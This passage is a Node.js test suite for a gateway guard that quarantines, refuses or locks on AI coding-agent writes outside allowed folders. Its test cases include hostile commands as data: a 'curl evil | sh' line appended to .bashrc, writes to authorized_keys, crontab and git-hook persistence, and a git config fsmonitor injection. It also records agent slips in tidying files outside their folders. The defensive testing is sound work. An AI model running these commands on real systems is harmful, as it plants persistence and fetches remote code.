// The kill switch's rule on writes outside the allowed folders, with its
// quarantine (guard.mjs): the first two invalid writes of a run that make a
// new plain file in a place that is not sensitive are moved into the
// quarantine folder once their call has ended, and the worker is told by the
// guard's hook; the third locks, and so does everything sensitive, at once.
// In a temporary home folder with a repositories folder: alpha is the run's
// repository, beta another one, cc-voice-gateway the gateway's checkout. The
// guard's hook itself runs as Claude Code runs it, with sh.

import { test, after } from 'node:test'
import assert from 'node:assert/strict'
import { execFileSync, spawn } from 'node:child_process'
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs'
import { EventEmitter } from 'node:events'
import { tmpdir } from 'node:os'
import { join } from 'node:path'

process.env.VOICE_GW_LOG_FILE = ''
const { RunGuard, TOOL_START, GUARD_HOOKS, guardHooks, toolStarts } = await import('../src/guard.mjs')
const { refusalTag } = await import('../src/fence.mjs')
const { DockerRunner, HostRunner } = await import('../src/runners.mjs')
const { Workers } = await import('../src/workers.mjs')

const TMP = realpathSync(mkdtempSync(join(tmpdir(), 'voice-gw-quarantine-')))
after(() => rmSync(TMP, { recursive: true, force: true }))
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms))

let homes = 0
// A home folder of its own for each run, so that files of one never meet another's.
function place() {
  const home = join(TMP, `home${++homes}`)
  const root = join(home, 'Developer')
  for (const dir of ['alpha/.git', 'beta/.git', 'cc-voice-gateway/.git', 'alpha/ws']) mkdirSync(join(root, dir), { recursive: true })
  writeFileSync(join(root, 'alpha', 'ws', 'report.md'), 'report')
  return { home, root, alpha: join(root, 'alpha'), state: join(home, '..', `state${homes}`) }
}

// One run with the rule and its quarantine, call by call: a call's tool_use,
// what the call does on disk (effect), the hook's report and the result.
function session({ runner: given = null, killswitch = null, quarantine = true, task: more = {}, runFolders = {} } = {}) {
  const where = place()
  const host = new HostRunner(where.root)
  const runner = given?.(where) ?? {
    root: where.root,
    dir: name => join(where.root, name),
    git: async () => null,
    inspect: path => host.inspect(path),
    quarantine: (path, dest) => host.quarantine(path, dest),
    removeEmpty: dir => host.removeEmpty(dir),
  }
  const workers = new EventEmitter()
  // The run folders the gateway knows (Workers' state), by their names under
  // the repositories folder.
  workers.state = { runFolders: Object.fromEntries(Object.entries(runFolders).map(([rel, entry]) => [join(where.root, rel), entry])) }
  const tripped = []
  const logged = []
  const warned = []
  const folder = join(where.state, 'quarantine')
  const guard = new RunGuard({
    workers,
    runner,
    killswitch: killswitch ?? { trip: event => tripped.push(event.reason), locks: () => true },
    quarantine: quarantine ? folder : null,
    home: where.home,
    temp: ['/nowhere/tmp'], // the test's folders are in the temporary folder
    gateway: join(where.root, 'cc-voice-gateway'),
    ghBin: '/bin/false',
    log: (...parts) => logged.push(parts.join(' ')),
  })
  guard.on('quarantined', (task, entry) => warned.push(entry))
  const refused = []
  guard.on('refused', (task, entry) => refused.push(entry))
  const notes = join(where.state, 'tasks', 'tq01.notes')
  const task = {
    id: 'tq01',
    repo: 'alpha',
    dir: where.alpha,
    slug: null,
    defaultBranch: 'main',
    startedAt: Date.now() - 1000,
    guardNotes: notes,
    ...(typeof more === 'function' ? more(where) : more),
  }
  if (task.runFolder) mkdirSync(task.runFolder, { recursive: true })
  workers.emit('started', task)
  let n = 0
  // A call that ends: what it does on disk, then its result.
  const call = async (command, { effect = null, name = 'Bash', input = null, error = false, report = null } = {}) => {
    const id = `toolu_${++n}`
    workers.emit('tool', task, { type: 'tool_use', id, name, input: input ?? (name === 'Bash' ? { command } : { file_path: command, content: 'x' }) })
    if (report) workers.emit('toolStart', task, { id, ...report })
    effect?.()
    workers.emit('toolResult', task, { id, error, text: '' })
    await decided()
    return id
  }
  const decided = async () => {
    const run = guard.runs.get(task.id)
    while (run?.deciding.size) await Promise.all([...run.deciding])
    await run?.mailbox
  }
  const notesText = () => (existsSync(notes) ? readFileSync(notes, 'utf8') : '')
  // A call through the guard's hook, as Claude Code runs it: the hook's
  // report goes to the rule; a call it refused gets the hook's reason as its
  // error, as Claude Code answers it, and does nothing; any other runs
  // (effect) and ends.
  let hooked = 0
  const viaHook = async (name, input, { cwd = where.alpha, effect = null, agent = null } = {}) => {
    const id = `toolu_h${++hooked}`
    await guard.runs.get(task.id)?.mailbox // the fence is there
    workers.emit('tool', task, { type: 'tool_use', id, name, input })
    const out = await hook({ tool_name: name, tool_input: input, tool_use_id: id, cwd, ...(agent ? { agent_id: agent } : {}) }, notes, { event: 'PreToolUse' })
    for (const report of toolStarts(`${out.out}\n${out.err}`)) workers.emit('toolStart', task, report)
    const decision = out.out.startsWith('{') ? JSON.parse(out.out).hookSpecificOutput : null
    if (decision?.permissionDecision === 'deny') {
      workers.emit('toolResult', task, { id, error: true, text: `PreToolUse:${name} hook error: ${decision.permissionDecisionReason}` })
    } else {
      effect?.()
      workers.emit('toolResult', task, { id, error: false, text: '' })
    }
    await decided()
    return { id, decision, ...out }
  }
  return { ...where, guard, task, tripped, logged, warned, refused, folder, notes, notesText, call, viaHook, end: async () => (await guard.ended(task), guard.close()) }
}

const make = (path, text = 'x') => () => {
  mkdirSync(join(path, '..'), { recursive: true })
  writeFileSync(path, text)
}

test('the first two new files outside go to quarantine, the worker is told, the third locks', async () => {
  const s = session()
  const first = join(s.root, 'report-2026-10-31-end.md')
  await s.call('cp ws/report.md ../report-2026-10-31-end.md', { effect: make(first, 'report') })
  assert.deepEqual(s.tripped, [])
  assert.ok(!existsSync(first), 'moved away')
  const file = join(s.folder, 'tq01', '1-report-2026-10-31-end.md')
  assert.equal(readFileSync(file, 'utf8'), 'report')
  assert.deepEqual(
    s.task.quarantined.map(({ n, tool, path, file: to, command }) => ({ n, tool, path, file: to, command })),
    [{ n: 1, tool: 'toolu_1', path: first, file, command: '"cp ws/report.md ../report-2026-10-31-end.md"' }],
  )
  assert.equal(s.warned.length, 1, 'for the warning on Telegram')
  const record = JSON.parse(readFileSync(join(s.folder, 'tq01', 'quarantine.jsonl'), 'utf8'))
  assert.equal(record.path, first)
  assert.equal(record.command, '"cp ws/report.md ../report-2026-10-31-end.md"')
  assert.equal(record.worker, 'alpha')
  assert.ok(s.logged.some(line => line.includes(`moved ${first} to quarantine (${file}), invalid write 1 of the run`)), s.logged.join('\n'))
  assert.match(s.notesText(), /^The gateway's guard: the command "cp ws\/report\.md \.\.\/report-2026-10-31-end\.md" wrote .*report-2026-10-31-end\.md, outside your allowed folders\./)
  assert.match(s.notesText(), /after a cd, give writes absolute paths, and keep backups and copies inside these folders too\. The third invalid write of a run locks the kill switch/)
  assert.ok(!existsSync(`${s.notes}.wait`), 'the turn may end again')

  await s.call('echo hi > ~/notes.txt', { effect: make(join(s.home, 'notes.txt')) })
  assert.deepEqual(s.tripped, [])
  assert.ok(existsSync(join(s.folder, 'tq01', '2-notes.txt')))
  assert.match(s.notesText(), /This was the second invalid write of this run: the next one locks the kill switch/)

  await s.call('touch ~/Desktop/third.txt', { effect: make(join(s.home, 'Desktop', 'third.txt')) })
  assert.equal(s.tripped.length, 1)
  assert.match(s.tripped[0], /^write outside the allowed folders: "touch ~\/Desktop\/third\.txt" writes .*\/Desktop\/third\.txt: the third invalid write in one run, after 2 went to quarantine \(worker alpha, task tq01\)$/)
  await s.end()
})

test('a Write call that makes a new file outside goes to quarantine as a command does; an Edit locks', async () => {
  const s = session()
  const draft = join(s.home, 'draft.md')
  await s.call(draft, { name: 'Write', effect: make(draft) })
  assert.deepEqual(s.tripped, [])
  assert.match(s.notesText(), /^The gateway's guard: the Write tool wrote .*\/draft\.md, outside your allowed folders/)
  await s.call(join(s.home, 'old.md'), { name: 'Edit', input: { file_path: join(s.home, 'old.md'), old_string: 'a', new_string: 'b' } })
  assert.match(s.tripped[0], /Edit .*\/old\.md: it changes a file in place, which locks at once/)
  await s.end()
})

test('what locks at once, the first time: changes, removals, links, folders, sensitive places, and what the guard cannot pin down', async () => {
  const saved = process.env.PATH
  try {
    const cases = [
      ['echo x >> ~/log.txt', null, /: it appends to a file, which locks at once/],
      ['echo x | tee -a ~/log.txt', null, /: it appends to a file/],
      ['rm ~/old.txt', null, /: it removes or moves files away/],
      ['mv a.txt ~/a.txt', null, /: it moves files there/],
      ['mv ~/b.txt .', null, /b\.txt: it removes or moves files away/],
      ['mkdir ~/made', null, /: it makes a folder/],
      ['ln -s ws/report.md ~/link.md', null, /: it makes a link/],
      ['chmod +x ~/run.sh', null, /: it changes a mode or an owner/],
      ['sed -i s/a/b/ ~/notes.txt', null, /: it changes a file in place/],
      ['truncate -s 0 ~/big.log', null, /: it truncates a file/],
      ['cp ws/report.md ../beta/report.md', s => make(join(s.root, 'beta', 'report.md')), /beta\/report\.md, in a git repository, which locks at once/],
      ['echo x > ../beta/.git/config', null, /: a hidden file or folder, where settings, keys and configuration live/],
      ['cp hook.sh ../beta/.git/hooks/pre-push', null, /: a git hook, which locks at once/],
      ['cp x.js ../cc-voice-gateway/src/x.js', null, /: the gateway's own checkout/],
      ['cp rc ~/.profile', null, /\.profile: a hidden file or folder/],
      ['cp rc ~/profile', null, /: a shell profile or rc file/],
      ['echo key >> ~/.ssh/authorized_keys', null, /authorized_keys: it appends to a file/],
      ['cp key ~/.ssh/id_new', null, /\.ssh\/id_new: a hidden file or folder/],
      ['cp s.json ~/.claude/settings.json', null, /\.claude\/settings\.json: a hidden file or folder/],
      ['cp x.desktop ~/.config/autostart/x.desktop', null, /autostart\/x\.desktop: a hidden file or folder/],
      ['cp x.service ~/.config/systemd/user/x.service', null, /x\.service: a hidden file or folder/],
      ['cp ci.yml ~/proj/.github/workflows/ci.yml', null, /ci\.yml: a hidden file or folder/],
      ['cp ci ~/proj/Jenkinsfile', null, /Jenkinsfile: a CI workflow file/],
      ['cp x ~/hooks/post-merge', null, /post-merge: a hooks folder/],
      ['cp x.plist ~/Library/LaunchAgents/x.plist', null, /x\.plist: macOS's Library folder/],
      ['cp tool ~/bin/tool', null, /bin\/tool: a folder on the PATH/],
      ['cp tool /opt/tool', null, /\/opt\/tool: outside the home folder and the repositories folder/],
      ['cp ws/report.md ~/ghost.md', null, /ghost\.md, which is not there afterwards, so the guard cannot tell what it wrote, which locks at once/],
      ['cp -r ws ~/copied', s => () => mkdirSync(join(s.home, 'copied'), { recursive: true }), /copied, which is no plain file/],
      ['ln ws/report.md ~/hard.md', null, /: it makes a link/],
    ]
    for (const [command, effect, reason] of cases) {
      const s = session()
      process.env.PATH = `${join(s.home, 'bin')}:${saved}`
      await s.call(command, { effect: effect?.(s) })
      assert.equal(s.tripped.length, 1, `${command}: ${s.tripped.join(' | ')}`)
      assert.match(s.tripped[0], reason, command)
      assert.equal(s.task.quarantined, undefined, command)
      await s.end()
    }
  } finally {
    process.env.PATH = saved
  }
})

test('a file that was there before the call is changed, not made: it locks', async () => {
  const s = session({ task: { guardHooks: true } })
  const old = join(s.home, 'existing.txt')
  writeFileSync(old, 'mine')
  await sleep(1100)
  await s.call('cp ws/report.md ../../existing.txt', { report: { cwd: s.alpha, at: Date.now() }, effect: () => writeFileSync(old, 'report') })
  assert.match(s.tripped[0], /existing\.txt, which was there before: the command changed an existing file, which locks at once/)
  assert.ok(existsSync(old), 'left where it is')
  await s.end()
})

test('a gateway that takes the run over finds what an earlier one moved, kept with the task, and counts it', async () => {
  const s = session()
  const earlier = join(s.root, 'report.md')
  // As the earlier gateway left it: moved, and kept with the task.
  s.task.quarantined = [{ n: 1, tool: 'toolu_1', path: earlier, file: join(s.folder, 'tq01', '1-report.md'), command: '"cp ws/report.md ../report.md"', at: Date.now() }]
  await s.call('cp ws/report.md ../report.md') // read again: the file is gone, nothing to look at
  assert.deepEqual(s.tripped, [])
  assert.equal(s.notesText(), '', 'told before')
  await s.call('cp ws/report.md ~/second.md', { effect: make(join(s.home, 'second.md')) })
  assert.deepEqual(s.tripped, [])
  assert.equal(s.task.quarantined.at(-1).n, 2)
  await s.call('cp ws/report.md ~/third.md', { effect: make(join(s.home, 'third.md')) })
  assert.match(s.tripped[0], /the third invalid write in one run/)
  await s.end()
})

test('without a quarantine folder, or with the rules only logging, every invalid write locks as before and the file stays', async () => {
  const s = session({ quarantine: false })
  const file = join(s.root, 'x.md')
  await s.call('cp ws/report.md ../x.md', { effect: make(file) })
  assert.match(s.tripped[0], /^write outside the allowed folders: "cp ws\/report\.md \.\.\/x\.md" writes .*\/Developer\/x\.md \(worker alpha, task tq01\)$/)
  assert.ok(existsSync(file))
  await s.end()
  const reported = []
  const t = session({ killswitch: { trip: event => reported.push(event.reason), locks: () => false } }) // VOICE_GW_KILLSWITCH=manual
  const other = join(t.root, 'y.md')
  await t.call('cp ws/report.md ../y.md', { effect: make(other) })
  assert.match(reported[0], /writes .*\/Developer\/y\.md \(/)
  assert.ok(existsSync(other), 'nothing moved')
  await t.end()
})

test('a run that ends before the result of its call: the write is decided at the end', async () => {
  const s = session()
  const file = join(s.home, 'late.txt')
  s.guard.workers.emit('tool', s.task, { type: 'tool_use', id: 'toolu_late', name: 'Bash', input: { command: 'node gen.js > ~/late.txt' } })
  make(file)()
  await s.end()
  assert.deepEqual(s.tripped, [])
  assert.ok(existsSync(join(s.folder, 'tq01', '1-late.txt')))
})

test('in the container: the look and the move through docker exec and docker cp, the note too', async () => {
  // A stand-in for docker that runs what docker exec would run, here.
  const bin = join(TMP, 'docker-bin')
  mkdirSync(bin, { recursive: true })
  const docker = join(bin, 'docker')
  writeFileSync(
    docker,
    '#!/bin/sh\necho "$*" >> "$(dirname "$0")/calls.log"\ncmd=$1; shift\ncase "$cmd" in\n  exec) shift; exec "$@" ;;\n  cp) cp -- "${1#*:}" "$2" ;;\nesac\n',
  )
  chmodSync(docker, 0o755)
  const s = session({ runner: where => new DockerRunner({ container: 'workers', root: where.root, dockerBin: docker }) })
  const file = join(s.root, 'shared.md')
  await s.call('cp ws/report.md ../shared.md', { effect: make(file, 'shared') })
  assert.deepEqual(s.tripped, [])
  assert.equal(readFileSync(join(s.folder, 'tq01', '1-shared.md'), 'utf8'), 'shared')
  assert.ok(!existsSync(file))
  assert.match(s.notesText(), /^The gateway's guard: the command "cp ws\/report\.md \.\.\/shared\.md" wrote/)
  const calls = readFileSync(join(bin, 'calls.log'), 'utf8')
  assert.match(calls, /^exec workers sh -c f=\$1/m)
  assert.match(calls, new RegExp(`^cp workers:${file} `, 'm'))
  assert.match(calls, /^exec workers rm -f -- /m)
  // In a git repository of the container, the look says so.
  await s.call('cp ws/report.md ../beta/x.md', { effect: make(join(s.root, 'beta', 'x.md')) })
  assert.match(s.tripped[0], /beta\/x\.md, in a git repository/)
  await s.end()
})

// --- the guard's hook, as Claude Code runs it ------------------------------------

function hook(input, notes, { event = 'PostToolUse', module = undefined } = {}) {
  const command = guardHooks(process.execPath, module)[event][0].hooks[0].command
  return new Promise((resolve, reject) => {
    const child = spawn('sh', ['-c', command], { env: { ...process.env, VOICE_GW_GUARD_NOTES: notes } })
    let out = ''
    let err = ''
    child.stdout.on('data', data => (out += data))
    child.stderr.on('data', data => (err += data))
    child.on('error', reject)
    child.on('close', code => resolve({ code, out, err }))
    child.stdin.end(JSON.stringify({ hook_event_name: event, ...input }))
  })
}

test("the guard's hook: the folder a call starts in before it, the guard's notes after it, and before the turn ends", async () => {
  const dir = join(TMP, 'hook')
  mkdirSync(dir, { recursive: true })
  const notes = join(dir, 'notes')
  // PreToolUse: one line, which Claude Code shows the model nothing of.
  const before = await hook({ tool_name: 'Bash', tool_use_id: 'toolu_9', cwd: '/work/alpha/sub', agent_id: 'a7', tool_input: { command: "echo 'x'" } }, notes, { event: 'PreToolUse' })
  assert.equal(before.code, 0)
  assert.ok(before.out.startsWith(TOOL_START))
  const [report] = toolStarts(`noise\n${before.out}`)
  assert.equal(report.id, 'toolu_9')
  assert.equal(report.cwd, '/work/alpha/sub')
  assert.equal(report.agent, 'a7')
  assert.ok(Math.abs(report.at - Date.now()) < 5000)
  // PostToolUse and PostToolUseFailure: nothing without notes; with notes, all of them once.
  assert.equal((await hook({ tool_name: 'Bash' }, notes)).out, '')
  writeFileSync(notes, "The gateway's guard: one.\n\nThe gateway's guard: two.\n\n")
  const told = JSON.parse((await hook({ tool_name: 'Bash' }, notes)).out)
  assert.deepEqual(told, { hookSpecificOutput: { hookEventName: 'PostToolUse', additionalContext: "The gateway's guard: one.\n\nThe gateway's guard: two." } })
  assert.ok(!existsSync(notes))
  assert.equal((await hook({ tool_name: 'Bash' }, notes)).out, '', 'once')
  writeFileSync(notes, "The gateway's guard: failed.\n")
  assert.equal(JSON.parse((await hook({ tool_name: 'Bash' }, notes, { event: 'PostToolUseFailure' })).out).hookSpecificOutput.hookEventName, 'PostToolUseFailure')
  // Stop: it waits while the guard decides, then the worker reads it before it ends.
  writeFileSync(`${notes}.wait`, '')
  setTimeout(() => {
    writeFileSync(notes, "The gateway's guard: late.\n")
    rmSync(`${notes}.wait`)
  }, 400)
  const started = Date.now()
  const stop = await hook({}, notes, { event: 'Stop' })
  assert.ok(Date.now() - started >= 350, 'it waited')
  assert.deepEqual(JSON.parse(stop.out), { decision: 'block', reason: "The gateway's guard: late." })
  assert.equal((await hook({ stop_hook_active: true }, notes, { event: 'Stop' })).out, '', 'the turn ends then')
  // The settings: before Bash and the file tools, after every tool, at the end;
  // the fence's module as the script's argument.
  const hooks = guardHooks('/usr/bin/node', '/gw/src/fence.mjs')
  assert.deepEqual(Object.keys(hooks), ['PreToolUse', 'PostToolUse', 'PostToolUseFailure', 'Stop'])
  assert.equal(hooks.PreToolUse[0].matcher, 'Bash|Write|Edit|MultiEdit|NotebookEdit')
  assert.match(hooks.Stop[0].hooks[0].command, /^'\/usr\/bin\/node' -e '[^']+' '\/gw\/src\/fence\.mjs'$/)
  assert.ok(!hooks.Stop[0].hooks[0].command.slice(20, -' \'/gw/src/fence.mjs\''.length - 1).includes("'"), 'one single-quoted script')
})

test("the run's result and worker_status say what went to quarantine, as a warning", () => {
  const root = join(TMP, 'result', 'Developer')
  mkdirSync(root, { recursive: true })
  const workers = new Workers({ root, stateDir: join(TMP, 'result', 'state') })
  try {
    const task = {
      id: 'tq02',
      repo: 'alpha',
      task: 'Write the report.',
      state: 'done',
      startedAt: Date.now() - 60000,
      finishedAt: Date.now(),
      steps: [],
      result: 'Done.',
      quarantined: [{ n: 1, tool: 'toolu_1', path: '/home/u/voice-scratch/report.md', file: '/gw/.state/quarantine/tq02/1-report.md', command: '"cp ws/report.md ../report.md"', at: Date.now() }],
    }
    const text = workers.resultText(task)
    assert.match(
      text,
      /^Warning: the run wrote 1 new file outside its allowed folders, and the gateway's guard moved it to quarantine as invalid writes: \/home\/u\/voice-scratch\/report\.md \(by "cp ws\/report\.md \.\.\/report\.md", now \/gw\/\.state\/quarantine\/tq02\/1-report\.md\)\. The third invalid write of a run locks the kill switch\. Tell the driver in a sentence, as a warning/m,
    )
    assert.ok(text.indexOf('Warning:') < text.indexOf('Result: Done.'), "the gateway's own lines first")
    assert.match(workers.taskLines('alpha', task).join('\n'), /^Warning: the run wrote 1 new file outside its allowed folders/m)
  } finally {
    workers.close()
  }
})

test('the guard\'s hook in a real shell line: Claude Code runs the command with sh, and the script survives the quoting', () => {
  const command = guardHooks(process.execPath).PreToolUse[0].hooks[0].command
  const out = execFileSync('sh', ['-c', command], { input: JSON.stringify({ hook_event_name: 'PreToolUse', tool_use_id: "toolu_'quoted'", cwd: "/work/it's here" }) }).toString()
  const [report] = toolStarts(out)
  assert.equal(report.id, "toolu_'quoted'")
  assert.equal(report.cwd, "/work/it's here")
})

// --- the guard's hook refuses a write outside before it runs (fence.mjs) ------------

// A run with the hooks that ask the fence, and its run folder, which the
// gateway knows: .voice-runs/alpha/84rf.
const fenced = (more = {}) =>
  session({
    task: where => ({ guardHooks: GUARD_HOOKS, runFolder: join(where.root, '.voice-runs', 'alpha', '84rf'), ...more }),
    runFolders: { '.voice-runs/alpha/84rf': { repo: 'alpha', container: null, usedAt: Date.now(), removedAt: null } },
  })

test("the locks of 2026-11-07, replayed through the guard's hook: the 09:38 mv and the 07:18 Write are refused before they run, and neither locks", async () => {
  const s = fenced()
  const runFolder = s.task.runFolder
  // What wrangler whoami left in the home folder at 09:38.
  const wrangler = join(s.home, '.config', '.wrangler')
  const cache = join(wrangler, 'cloudflare-skills-repo-cache.json')
  const log = join(wrangler, 'logs', 'wrangler-2026-11-07_09-38-22_697.log')
  make(cache)()
  make(log)()
  // The fence the gateway wrote for the hook.
  await s.guard.runs.get('tq01').mailbox
  const fence = JSON.parse(readFileSync(`${s.notes}.fence`, 'utf8'))
  assert.deepEqual(
    { kind: fence.kind, dir: fence.dir, home: fence.home, runFolder: fence.runFolder },
    { kind: 'repo', dir: s.alpha, home: s.home, runFolder },
  )
  assert.ok(fence.allowed.includes(s.alpha) && fence.allowed.includes(runFolder) && fence.allowed.includes('/nowhere/tmp'))

  // 09:38, task thaw: tidying up after wrangler.
  const command =
    'mkdir -p $TMPDIR/wrangler-home && mv ~/.config/.wrangler/cloudflare-skills-repo-cache.json ' +
    '~/.config/.wrangler/logs/wrangler-2026-11-07_09-38-22_697.log $TMPDIR/wrangler-home/ && ls ~/.config/.wrangler ' +
    '~/.config/.wrangler/logs; grep -v -i -E "token|key|secret" ~/.config/.wrangler/logs/wrangler-2026-10-31_04-37-41_093.log | head -40'
  const mv = await s.viaHook('Bash', { command, description: 'Move stray wrangler files to run folder, read old log' })
  assert.equal(mv.decision.permissionDecision, 'deny')
  const reason = mv.decision.permissionDecisionReason
  assert.ok(reason.startsWith(`${refusalTag(mv.id)} before it ran: it would remove or move away ${cache} (and 1 more path), outside your allowed folders`), reason)
  assert.ok(reason.includes(`Write only in your repository ${s.alpha}, your run folder ${runFolder} (also $TMPDIR and $VOICE_GW_RUN_FOLDER)`), reason)
  assert.match(reason, /Do not move, remove or tidy up files outside them, not even ones a tool left there, such as caches and logs in your home folder: leave them where they are and name them in your result instead\./)
  assert.match(reason, /A refused call counts as an invalid write: the third invalid write of a run stops all work\.$/)
  const [report] = toolStarts(mv.err)
  assert.deepEqual([report.id, report.cwd, report.refused], [mv.id, s.alpha, true], 'the report on stderr')
  assert.equal(toolStarts(mv.out).length, 0, 'stdout holds only the refusal')
  assert.ok(existsSync(cache) && existsSync(log), 'nothing moved')
  assert.deepEqual(s.tripped, [], 'no lock')
  assert.deepEqual(s.task.refused.map(({ n, tool, paths }) => ({ n, tool, paths })), [{ n: 1, tool: mv.id, paths: [cache, log] }])
  assert.match(s.task.refused[0].command, /^"mkdir -p \$TMPDIR\/wrangler-home && mv ~\/\.config/)
  assert.equal(s.refused.length, 1, 'for the warning on Telegram')
  assert.ok(
    s.logged.some(
      line =>
        line.includes(`the guard's hook refused "mkdir -p $TMPDIR/wrangler-home && mv`) &&
        line.includes(`which would have written ${cache}, ${log}; invalid write 1 of the run; the third locks the kill switch (worker alpha, task tq01)`),
    ),
    s.logged.join('\n'),
  )
  assert.equal(s.notesText(), '', 'the refusal said it all')

  // 07:18, task tu46: the run folder's name typed with the day's date.
  const guessed = join(s.root, '.voice-runs', 'alpha', '2026-11-07-84rf', 'pr-body.md')
  const write = await s.viaHook('Write', { file_path: guessed, content: 'placeholder' })
  assert.equal(write.decision.permissionDecision, 'deny')
  assert.ok(write.decision.permissionDecisionReason.startsWith(`${refusalTag(write.id)} before it ran: it would write ${guessed}, outside your allowed folders`))
  assert.ok(write.decision.permissionDecisionReason.includes(`your run folder ${runFolder}`))
  assert.ok(!existsSync(join(s.root, '.voice-runs', 'alpha', '2026-11-07-84rf')), 'no folder made')
  assert.deepEqual(s.tripped, [], 'no lock')
  const run = s.guard.runs.get('tq01')
  assert.deepEqual([run.edits, run.helperEdits, run.files.size], [0, 0, 0], 'a refused call is no write and no edit')
  assert.equal(s.task.refused.at(-1).n, 2)
  assert.match(s.notesText(), /^The gateway's guard: it refused the Write tool before it ran, as the second invalid write of this run: the next one locks the kill switch/)

  // The worker writes where it should: the run goes on.
  const fine = await s.viaHook('Write', { file_path: join(runFolder, 'pr-body.md'), content: 'body' }, { effect: make(join(runFolder, 'pr-body.md')) })
  assert.equal(fine.decision, null)
  assert.equal(toolStarts(fine.out)[0].id, fine.id)
  assert.deepEqual(s.tripped, [])

  // A third attempt is a worker pushing against the fence: it locks.
  await s.viaHook('Bash', { command: 'echo x > ~/notes.txt' })
  assert.equal(s.tripped.length, 1)
  assert.match(
    s.tripped[0],
    /^write outside the allowed folders: "echo x > ~\/notes\.txt" writes .*\/notes\.txt: the third invalid write in one run, refused by the guard's hook before it ran, after the guard's hook refused 2 \(worker alpha, task tq01\)$/,
  )
  assert.ok(!existsSync(join(s.home, 'notes.txt')))
  await s.end()
})

test('a refused call counts as no write: the rule waits for its result, which proves it, and checks a call that ran after all', async () => {
  // The report and the result alone, as the run's stream shows them.
  const s = fenced()
  const emit = (event, ...args) => s.guard.workers.emit(event, s.task, ...args)
  emit('tool', { type: 'tool_use', id: 'toolu_a', name: 'Write', input: { file_path: join(s.home, 'draft.md'), content: 'x' } })
  emit('toolStart', { id: 'toolu_a', cwd: s.alpha, refused: true, at: Date.now() })
  const run = s.guard.runs.get('tq01')
  assert.equal(run.calls.get('toolu_a').checked, false, 'not checked: it waits for the result')
  emit('toolResult', { id: 'toolu_a', error: true, text: `PreToolUse:Write hook error: ${refusalTag('toolu_a')} before it ran: …` })
  assert.deepEqual([s.tripped, run.edits, s.task.refused.length], [[], 0, 1])

  // The refusal's words with the call's own id are what counts, also without the report.
  const edit = { type: 'tool_use', id: 'toolu_b', name: 'Edit', input: { file_path: join(s.home, 'old.md'), old_string: 'a', new_string: 'b' } }
  emit('tool', edit)
  const waiting = run.calls.get('toolu_b')
  emit('toolResult', { id: 'toolu_b', error: true, text: `PreToolUse:Edit hook error: ${refusalTag('toolu_b')} before it ran: …` })
  assert.deepEqual([s.tripped, run.edits, s.task.refused.length], [[], 0, 2])
  // The wait for its report ends later: it finds the call done with.
  s.guard.check(run, waiting)
  assert.deepEqual([s.tripped, run.edits], [[], 0])
  await s.end()

  // A report of a refusal whose result does not prove it: checked as a call that ran.
  const t = fenced()
  const ran = join(t.home, 'ran.md')
  t.guard.workers.emit('tool', t.task, { type: 'tool_use', id: 'toolu_c', name: 'Bash', input: { command: 'cp ws/report.md ~/ran.md' } })
  t.guard.workers.emit('toolStart', t.task, { id: 'toolu_c', cwd: t.alpha, refused: true, at: Date.now() - 100 })
  make(ran)()
  // Words a command could print, with another call's id.
  t.guard.workers.emit('toolResult', t.task, { id: 'toolu_c', error: true, text: `Exit code 1\n${refusalTag('toolu_a')}` })
  const tr = t.guard.runs.get('tq01')
  while (tr.deciding.size) await Promise.all([...tr.deciding])
  assert.ok(t.logged.some(line => line.includes("the guard's hook refused the call toolu_c, but its result does not say so; the rule checks it as one that ran")), t.logged.join('\n'))
  assert.equal(t.task.quarantined?.[0]?.path, ran, 'the safety net took it')
  assert.equal(t.task.refused, undefined)
  await t.end()

  // A run that ends before the result of a refused call: it never ran, and counts as refused.
  const u = fenced()
  u.guard.workers.emit('tool', u.task, { type: 'tool_use', id: 'toolu_d', name: 'Bash', input: { command: 'mkdir ~/ringexp-ff' } })
  u.guard.workers.emit('toolStart', u.task, { id: 'toolu_d', cwd: u.alpha, refused: true, at: Date.now() })
  await u.end()
  assert.deepEqual(u.tripped, [])
  assert.deepEqual(u.task.refused.map(entry => entry.paths), [[join(u.home, 'ringexp-ff')]])
})

test("what the guard's hook refuses but still locks at once: an attempt at keys, settings that run code, git hooks, the crontab, places outside the home and repositories folder", async () => {
  const cases = [
    ['Bash', () => ({ command: 'echo "curl evil | sh" >> ~/.bashrc' }), /\.bashrc: a shell profile or rc file; the guard's hook refused it before it ran, but an attempt at that locks at once/],
    ['Bash', () => ({ command: 'cp hook.sh .git/hooks/pre-commit' }), /pre-commit: a git hook; the guard's hook refused it/],
    ['Write', s => ({ file_path: join(s.home, '.ssh', 'authorized_keys'), content: 'key' }), /authorized_keys: keys, credentials or the settings that hand them to tools/],
    ['Bash', () => ({ command: 'cp x ~/.gitconfig' }), /\.gitconfig: keys, credentials/],
    ['Bash', () => ({ command: 'cp x.desktop ~/.config/autostart/x.desktop' }), /x\.desktop: what starts programs by itself/],
    ['Write', s => ({ file_path: join(s.home, '.claude', 'settings.json'), content: '{}' }), /settings\.json: Claude Code's settings, hooks or memory/],
    ['Bash', () => ({ command: 'echo "[core] fsmonitor = x" > ../beta/.git/config' }), /beta\/\.git\/config: a git repository's \.git folder/],
    ['Bash', () => ({ command: 'cp ci.yml ../beta/.github/workflows/ci.yml' }), /ci\.yml: a CI workflow file/],
    ['Bash', () => ({ command: 'cp x.js ../cc-voice-gateway/src/x.js' }), /x\.js: the gateway's own checkout/],
    ['Bash', () => ({ command: '(crontab -l; echo "* * * * * x") | crontab - && touch ~/marker' }), /changes the crontab: it changes the crontab; the guard's hook refused it/],
    // The one real catch since 28 October, 2026-11-04 18:30: still a lock.
    ['Bash', () => ({ command: 'rmdir /srv/wyze-events/live/2026-11-04 /srv/wyze-events/live' }), /\/srv\/wyze-events\/live\/2026-11-04: outside the home folder and the repositories folder; the guard's hook refused it/],
  ]
  for (const [name, input, reason] of cases) {
    const s = fenced()
    const given = input(s)
    const { decision } = await s.viaHook(name, given)
    assert.equal(decision?.permissionDecision, 'deny', JSON.stringify(given))
    assert.equal(s.tripped.length, 1, `${JSON.stringify(given)}: ${s.tripped.join(' | ')}`)
    assert.match(s.tripped[0], reason, JSON.stringify(given))
    assert.equal(s.task.refused, undefined)
    await s.end()
  }
  // Slips like those of the locks since 28 October: refused and counted, no lock.
  for (const command of [
    'mkdir -p ~/ringexp-ff', // 10-30, a browser profile
    'ln -sf ../implicit-globals/node_modules ../node_modules', // 10-31
    'mkdir -p ~/voice-scratch/drawusaurus-redesign', // 11-01
